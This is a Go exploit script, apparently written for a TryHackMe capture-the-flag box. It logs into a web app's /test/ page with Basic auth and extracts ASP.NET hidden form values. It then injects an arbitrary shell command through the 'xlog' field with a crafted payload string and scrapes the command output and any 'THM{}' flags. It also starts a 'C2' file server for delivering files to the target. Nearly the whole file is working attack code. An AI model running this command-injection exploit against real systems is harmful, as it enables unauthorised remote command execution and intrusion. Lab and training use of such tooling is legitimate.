package main

import (
	"crypto/tls"
	"encoding/base64"
	"errors"
	"flag"
	"fmt"
	"io/ioutil"
	"math/rand"
	"net"
	"net/http"
	"net/url"
	"os"
	"regexp"
	"strings"
	"sync"
	"time"
)

var SERVER_RUNNING bool = false

var ANSI_CLRLN string = "\r\x1b[2K\r"
var ANSI_CLRSC string = "\x1b[2J\x1b[H"
var ANSI_RST string = "\x1b[0m"
var ANSI_RED string = "\x1b[31;1m"
var ANSI_GRN string = "\x1b[32;1m"
var ANSI_YLW string = "\x1b[33;1m"
var ANSI_BLU string = "\x1b[34;1m"

// Global Variables: Server
var SRV http.Server

type Client struct {
	baseURL string
	Route   string
	Session *http.Client
	Creds   LoginCredentials
}

type LoginCredentials struct {
	Username string
	Password string
}

//
// Function Name: AccessServicePage
//
// Author: Thomas Osgood
//
// Description:
//
//  Function designed to confirm access to the test
//  page on the target machine. This will validate
//  the user credentials provided.
//
// Input(s):
//
//  None
//
// Return(s):
//
//  err - error. error or nil.
//
func (c *Client) AccessServicePage() (err error) {
	var req *http.Request
	var resp *http.Response
	var targeturl string = fmt.Sprintf("%s/test/", c.baseURL)

	req, err = http.NewRequest(http.MethodGet, targeturl, nil)
	if err != nil {
		return err
	}

	err = c.BuildHeaders(&req)
	if err != nil {
		return err
	}

	resp, err = c.Session.Do(req)
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	if resp.StatusCode != 200 {
		return errors.New(fmt.Sprintf("cannot access test page (%s)", resp.Status))
	}

	return nil
}

//
// Function Name: BuildHeaders
//
// Author: Thomas Osgood
//
// Description:
//
//  Function designed to take an HTTP request and set the
//  correct authorization header and origin header.
//
// Input(s):
//
//  req - **http.Request. http request to set headers for.
//
// Return(s):
//
//  err - error. error or nil.
//
func (c *Client) BuildHeaders(req **http.Request) (err error) {
	var authString string
	var encodeingFormat string = fmt.Sprintf("%s:%s", c.Creds.Username, c.Creds.Password)
	var encodedCreds string = base64.StdEncoding.EncodeToString([]byte(encodeingFormat))

	authString = fmt.Sprintf("Basic %s", encodedCreds)

	(*req).Header.Set("Authorization", authString)
	(*req).Header.Set("Origin", c.baseURL)

	return nil
}

//
// Function Name: ExecCommand
//
// Author: Thomas Osgood
//
// Description:
//
//  Function designed to execute a command on the
//  target via an HTML text input.
//
// Input(s):
//
//  command - string. command to execute on target.
//
// Return(s):
//
//  output - string. output of executed command.
//  err - error. error or nil.
//
func (c *Client) ExecCommand(command string) (output string, err error) {
	var bodycontent []byte
	var bitlockerstr string
	var flagval string
	var hiddeninfo map[string]string
	var payload string = fmt.Sprintf("BitlockerActiveMonitoringLogs'); %s;#", command)
	var req *http.Request
	var resp *http.Response
	var targeturl string = fmt.Sprintf("%s/test/", c.baseURL)
	var values url.Values = url.Values{}

	SysMsgNB("getting hidden form values for post request ...")
	hiddeninfo, err = c.GetHiddenValues()
	if err != nil {
		return "", err
	}

	values.Set("Button", "Run")
	for key, val := range hiddeninfo {
		values.Set(key, val)
	}
	values.Set("xlog", payload)

	SysMsgNB("building request ...")
	req, err = http.NewRequest(http.MethodPost, targeturl, strings.NewReader(values.Encode()))
	if err != nil {
		return "", err
	}

	err = c.BuildHeaders(&req)
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")

	SysMsgNB("sending payload to target ...")
	resp, err = c.Session.Do(req)
	if err != nil {
		if os.IsTimeout(err) {
			return "", nil
		}
		return "", err
	}
	defer resp.Body.Close()

	SysMsgNB("processing response ...")
	bodycontent, err = ioutil.ReadAll(resp.Body)
	if err != nil {
		return "", err
	}

	flagval, err = FindMatch(bodycontent, "THM{.*}")
	if err != nil {
		ErrMsg("flag not found on page")
	} else {
		SucMsg(fmt.Sprintf("Flag: %s", flagval))
	}

	bitlockerstr, err = FindMatch(bodycontent, "List generated at.*")
	if err != nil {
		ErrMsg("bitlocker string not found")
	} else {
		bodycontent = []byte(strings.Replace(string(bodycontent), bitlockerstr, "", -1))
	}

	SysMsgNB("grabbing command output ...")
	// Grab command output
	output, err = FindMatch(bodycontent, "<pre>((.|\n)*?)</pre>")
	output = strings.Replace(output, "<pre>", "", -1)
	output = strings.Replace(output, "</pre>", "", -1)
	output = strings.Trim(output, "\n\r")
	output = fmt.Sprintf("%s\n", output)

	// Search for flag in command output
	flagval, err = FindMatch([]byte(output), "(thm|THM){.*}")
	if err != nil {
		ErrMsg("flag not found in command output")
	} else {
		SucMsg(fmt.Sprintf("Flag: %s", flagval))
	}

	return output, nil
}

//
// Function Name: GetHiddenValues
//
// Author: Thomas Osgood
//
// Description:
//
//  Function designed to extract the hidden form values
//  necessary to make a valid POST request from the
//  target's /test/ page.
//
// Input(s):
//
//  None
//
// Return(s):
//
//  hiddeninfo - map[string]string. map containing extracted info.
//  err - error. error or nil.
//
func (c *Client) GetHiddenValues() (hiddeninfo map[string]string, err error) {
	var bodycontent []byte
	var req *http.Request
	var resp *http.Response
	var targeturl string = fmt.Sprintf("%s/test", c.baseURL)
	var targetvalues []string = []string{"__VIEWSTATE", "__VIEWSTATEGENERATOR", "__EVENTVALIDATION"}

	hiddeninfo = map[string]string{}

	req, err = http.NewRequest(http.MethodGet, targeturl, nil)
	if err != nil {
		return nil, err
	}

	err = c.BuildHeaders(&req)
	if err != nil {
		return nil, err
	}

	resp, err = c.Session.Do(req)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()

	if resp.StatusCode != 200 {
		return nil, errors.New(fmt.Sprintf("error contacting test page (%s)", resp.Status))
	}

	bodycontent, err = ioutil.ReadAll(resp.Body)
	if err != nil {
		return nil, err
	}

	for _, val := range targetvalues {
		hiddeninfo[val], err = c.ParseValue(bodycontent, val)
		if err != nil {
			return nil, err
		}
	}

	return hiddeninfo, nil
}

//
// Function Name: ParseValue
//
// Author: Thomas Osgood
//
// Description:
//
//  Function designed to pull out a value for a given key.
//  This will be used to grab hidden form values from
//  the target page.
//
// Input(s):
//
//  bodycontent - []byte. content to look in.
//  key - string. key to get value for.
//
// Return(s):
//
//  value - string. value extracted from bodycontent.
//  err - error. error or nil.
//
func (c *Client) ParseValue(bodycontent []byte, key string) (value string, err error) {
	var pattern string = fmt.Sprintf("id=\"%s\" value=\"(.*)\" />", key)

	value, err = FindMatch(bodycontent, pattern)
	if err != nil {
		return "", err
	}

	value = strings.Split(value, "value=")[1]
	value = strings.Replace(value, "/>", "", -1)
	value = strings.Replace(value, " ", "", -1)
	value = strings.Replace(value, "\"", "", -1)

	return value, nil
}

// ============================================================
//
// Function Name: Testconnection
//
// Author: Thomas Osgood
//
// Description:
//
//  Function designed to test the connection to a target.
//
// Input(s):
//
//  None.
//
// Return(s):
//
//  success - bool. indication of success.
//  message - string. status message.
//
// ============================================================
func (c *Client) TestConnection() (success bool, message string) {
	SysMsgNB(fmt.Sprintf("testing connection to \"%s\"", c.baseURL))

	resp, err := c.Session.Get(c.baseURL)
	if err != nil {
		return false, err.Error()
	}
	defer resp.Body.Close()

	return true, "client connection successful"
}

func SucMsg(msg string) {
	fmt.Printf("%s[%s+%s] %s\n", ANSI_CLRLN, ANSI_GRN, ANSI_RST, msg)
	return
}

func ErrMsg(msg string) {
	fmt.Printf("%s[%s-%s] %s\n", ANSI_CLRLN, ANSI_RED, ANSI_RST, msg)
	return
}

func InfMsg(msg string) {
	fmt.Printf("%s[%si%s] %s\n", ANSI_CLRLN, ANSI_BLU, ANSI_RST, msg)
	return
}

func InfMsgNB(msg string) {
	fmt.Printf("%s[%si%s] %s", ANSI_CLRLN, ANSI_BLU, ANSI_RST, msg)
	return
}

func SysMsg(msg string) {
	fmt.Printf("%s[%s*%s] %s\n", ANSI_CLRLN, ANSI_YLW, ANSI_RST, msg)
	return
}

func SysMsgNB(msg string) {
	fmt.Printf("%s[%s*%s] %s", ANSI_CLRLN, ANSI_YLW, ANSI_RST, msg)
	return
}

func ValidatePort(portno int) (success bool, message string) {
	if (portno < 1) || (portno > 65535) {
		return false, "port must be between 1 and 65535"
	}
	return true, "port valid"
}

//============================================================
//
// Function Name: PrintCenter
//
// Author: Thomas Osgood
//
// Description:
//
//  Function designed to print a message in the center of a
//  specified number of columns (n).
//
// Input(s):
//
//  msg - string. message to display.
//  n - int. total number of columns in row.
//
// Return(s):
//
//  None
//
//============================================================
func PrintCenter(msg string, n int) {
	var ansi_indent string = "\x1b%s"
	var indent_format string = "[%dC"
	var indent int

	fmt.Printf("%s", ANSI_CLRLN)
	if len(msg) > n {
		fmt.Printf("%s\n", msg)
		return
	}

	indent = (n - len(msg)) / 2
	indent_format = fmt.Sprintf(indent_format, indent)
	ansi_indent = fmt.Sprintf(ansi_indent, indent_format)

	fmt.Printf("%s%s%s%s\n", ansi_indent, ANSI_YLW, msg, ANSI_RST)

	return
}

func PrintChar(char byte, n int) {
	if n < 1 {
		return
	}

	for i := 0; i < n; i++ {
		fmt.Printf("%s%s%s", ANSI_RED, string(char), ANSI_RST)
	}
	fmt.Printf("\n")
}

//
// Function Name: StartListener
//
// Author: Thomas Osgood
//
// Description:
//
//    Function designed to create an HTTP file server to use during
//    this attack. It can deliver files to the target.
//
// Input(s):
//
//    ip - string. ip address to listen on.
//    port - int. port to listen on.
//
// Return(s):
//
//    err - error. error or nil.
//
func StartListener(ip string, port int, wg *sync.WaitGroup) (err error) {
	if wg != nil {
		defer wg.Done()
	}
	SERVER_RUNNING = true

	SRV = http.Server{Addr: fmt.Sprintf("%s:%d", ip, port)}

	var currentDir string
	var fs http.Handler

	currentDir, err = os.Getwd()

	fs = http.FileServer(http.Dir(currentDir))

	http.Handle("/", http.StripPrefix("/", fs))

	SucMsg(fmt.Sprintf("File server starting on port %s:%d", ip, port))
	if err = SRV.ListenAndServe(); err != http.ErrServerClosed {
		ErrMsg(err.Error())
		return err
	}
	SucMsg("server successfully shutdown")

	return nil
}

//============================================================
//
// Function Name: FindMatch
//
// Author: Thomas Osgood
//
// Description:
//
//  Function designed to take a byte slice, search the slice
//  for a given regular expression pattern, and return the
//  first match of that pattern.
//
// Input(s):
//
//  bodycontent - []byte. byte slice to search for pattern.
//  tgtpattern - string. regex pattern to search for.
//
// Return(s):
//
//  match - string. first match of pattern discovered.
//  success - bool. indication of success.
//  message - string. status message.
//
//============================================================
func FindMatch(bodycontent []byte, tgtpattern string) (match string, err error) {

	re, err := regexp.Compile(tgtpattern)
	if err != nil {
		return "", err
	}

	matches := re.FindAll(bodycontent, -1)

	if len(matches) < 1 {
		return "", errors.New("no match found")
	}

	match = string(matches[0])

	return match, nil
}

// ============================================================
//
// Function Name: GenRandomName
//
// Author: Thomas Osgood
//
// Description:
//
//  Function designed to generate a random string 8 characters
//  long, containing only alpha-numeric characters.
//
// Input(s):
//
//  None.
//
// Return(s):
//
//  success - bool. indication of success.
//  message - string. status message.
//
// ============================================================
func GenRandomName() (name string, success bool, message string) {
	const charset string = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	const length int = 8

	rand.Seed(time.Now().UnixMilli())

	name = ""

	for i := 0; i < length; i++ {
		name = fmt.Sprintf("%s%s", name, string(charset[rand.Intn(len(charset))]))
	}

	return name, true, "name successfully generated"
}

//
// Function Name: GrabIPs
//
// Author: Thomas Osgood
//
// Description:
//
//    Function designed to acquire all IPv4 network addresses
//    attached to the current machine. If the targetIface
//    argument is set to "", all network interfaces will be
//    searched. If a specific network interface is speficied,
//    only that interface's IP address(es) will be returned.
//    If the specified network interface does not exist, an
//    error will be returned.
//
// Input(s):
//
//    targetIface - string. interface to get IP for.
//
// Return(s):
//
//    ipList - []net.IP. list of IP addresses acquired.
//    err - error. error or nil.
//
func GrabIPs(targetIface string) (ipList []net.IP, err error) {
	var address net.Addr
	var addresses []net.Addr
	var foundiface bool = false
	var iface net.Interface
	var interfaces []net.Interface
	var ip net.IP

	//------------------------------------------------------------
	// grab all network interfaces
	//------------------------------------------------------------
	interfaces, err = net.Interfaces()
	if err != nil {
		return nil, err
	}

	for _, iface = range interfaces {

		//------------------------------------------------------------
		// ignore loopback addresses (127.0.0.1)
		//------------------------------------------------------------
		if strings.Contains(iface.Flags.String(), net.FlagLoopback.String()) {
			continue
		}

		//------------------------------------------------------------
		// if target interface is set, only display target
		//------------------------------------------------------------
		if (len(targetIface) > 0) && (iface.Name != targetIface) {
			continue
		}

		foundiface = true

		//------------------------------------------------------------
		// grab all addresses from current interface
		//------------------------------------------------------------
		addresses, err = iface.Addrs()
		if err != nil {
			return nil, err
		}

		//------------------------------------------------------------
		// loop through all addresses present in current interface
		//------------------------------------------------------------
		for _, address = range addresses {
			switch v := address.(type) {
			case *net.IPNet:
				ip = v.IP
			case *net.IPAddr:
				ip = v.IP
			}

			//------------------------------------------------------------
			// only grab IPv4 addresses
			//------------------------------------------------------------
			if ip.To4() == nil {
				continue
			}

			ipList = append(ipList, ip)
		}
	}

	//------------------------------------------------------------
	// error finding target (or any) network interface
	//------------------------------------------------------------
	if (len(targetIface) > 0) && !foundiface {
		return nil, errors.New(fmt.Sprintf("unable to find interface \"%s\"", targetIface))
	} else if !foundiface {
		return nil, errors.New("no network interfaces discovered")
	}

	return ipList, nil
}

func init() {
	return
}

func main() {
	var domain string
	var port int

	var baseURL string
	var scheme string

	var secure bool
	var iface bool

	var ips []net.IP
	var err error

	var c2ip string
	var c2p int

	var transport *http.Transport = &http.Transport{TLSClientConfig: &tls.Config{InsecureSkipVerify: true}}
	var client Client = Client{Session: &http.Client{Timeout: 10 * time.Second, Transport: transport}}
	var creds LoginCredentials = LoginCredentials{}

	var username string
	var password string

	var command string
	var output string

	flag.StringVar(&domain, "d", "127.0.0.1", "domain or ip address of target")
	flag.IntVar(&port, "p", 80, "port to communicate with target on")
	flag.BoolVar(&secure, "s", false, "use HTTPS instead of HTTP")
	flag.BoolVar(&secure, "secure", false, "use HTTPS instead of HTTP")
	flag.StringVar(&c2ip, "c2ip", "", "ip, domain, or interface of C2 server")
	flag.IntVar(&c2p, "c2port", 9999, "port to contact c2 server on")
	flag.BoolVar(&iface, "interface", false, "c2ip specified is network interface")
	flag.StringVar(&username, "username", "admin", "username to connect with")
	flag.StringVar(&password, "password", "admin", "password for user")
	flag.StringVar(&command, "command", "whoami", "command to run on the target")
	flag.Parse()

	creds.Username = username
	creds.Password = password
	client.Creds = creds

	success, message := ValidatePort(port)
	if !success {
		ErrMsg(message)
		os.Exit(1)
	}

	if len(c2ip) > 0 {
		//============================================================
		// if "c2" specified is a network interface, take the
		// IP address of the interface and assign it to the
		// c2 variable to be used
		//============================================================
		if iface {
			ips, err = GrabIPs(c2ip)
			if err != nil {
				ErrMsg(err.Error())
				os.Exit(1)
			}
			c2ip = ips[0].String()
		}

		success, message = ValidatePort(c2p)
		if !success {
			ErrMsg(message)
			os.Exit(1)
		}

	}

	PrintChar('=', 60)
	PrintCenter("Target Information", 60)
	PrintChar('=', 60)
	InfMsg(fmt.Sprintf("Target Domain: %s", domain))
	InfMsg(fmt.Sprintf("Target Port: %d", port))
	InfMsg(fmt.Sprintf("HTTPS: %v", secure))

	if len(c2ip) > 0 {
		InfMsg(fmt.Sprintf("C2IP: %s", c2ip))
		InfMsg(fmt.Sprintf("C2Port: %d", c2p))
	}

	PrintChar('=', 60)

	//============================================================
	// HTTPS check.
	//============================================================
	if secure {
		scheme = "https"
	} else {
		scheme = "http"
	}
	baseURL = fmt.Sprintf("%s://%s:%d", scheme, domain, port)

	if len(c2ip) > 0 {
		go StartListener(c2ip, c2p, nil)
		time.Sleep(time.Millisecond * 250)
	}

	client.baseURL = baseURL

	//============================================================
	// Make sure the target is reachable.
	//============================================================
	success, message = client.TestConnection()
	if !success {
		ErrMsg(message)
		os.Exit(1)
	}
	SucMsg(message)

	err = client.AccessServicePage()
	if err != nil {
		ErrMsg(err.Error())

		if SERVER_RUNNING {
			SRV.Close()
		}
		os.Exit(1)
	}
	SucMsg("access to test page confirmed")

	output, err = client.ExecCommand(command)
	if err != nil {
		ErrMsg(err.Error())

		if SERVER_RUNNING {
			SRV.Close()
		}

		os.Exit(1)
	}

	if len(output) > 0 {
		PrintChar('=', 60)
		PrintCenter("Output", 60)
		PrintChar('=', 60)
		fmt.Printf(output)
		PrintChar('=', 60)
	} else {
		InfMsg("no content returned by command")
	}

	if SERVER_RUNNING {
		SRV.Close()
	}

	return
}

